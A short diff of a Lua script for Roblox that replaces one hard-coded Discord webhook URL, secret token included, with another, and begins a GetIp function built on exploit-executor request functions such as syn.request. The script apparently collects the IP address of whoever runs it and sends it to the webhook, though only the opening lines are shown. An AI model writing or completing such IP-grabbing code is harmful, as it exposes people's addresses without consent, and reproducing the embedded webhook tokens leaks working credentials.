@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-local webhook_url = "https://discord.com/api/webhooks/1045224627323499226/uI3bf198F_xMgyDLuzHaDR5M_J0ouoRGbFK3sYbNCn4oU-QZwzfSE97JRRI5K1hJI-2J"
+local webhook_url = "https://discord.com/api/webhooks/1045224627323499226/uI3bf198F_xMgyDLuzDR5M_J0ouoRGbFK3s32rwegn4oU-QZwzfSE9JRRI5K1hJI-2J"
 
 local function GetIp() : string
     local request = request or http_request or (syn and syn.request)
